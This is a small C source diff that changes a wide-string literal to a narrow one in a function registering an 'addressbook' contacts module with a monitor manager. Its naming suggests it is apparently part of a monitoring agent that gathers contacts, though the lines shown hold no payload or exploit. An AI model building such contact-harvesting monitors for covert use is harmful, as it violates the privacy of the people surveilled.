@@ -266,5 +266,5 @@ DWORD WINAPI PM_ContactsInit(JSONObject elem)
 void PM_ContactsRegister()
 {
 	shared.bPM_ContactsStarted = FALSE;
-	AM_MonitorRegister(L"addressbook", PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
+	AM_MonitorRegister("addressbook", PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
 }
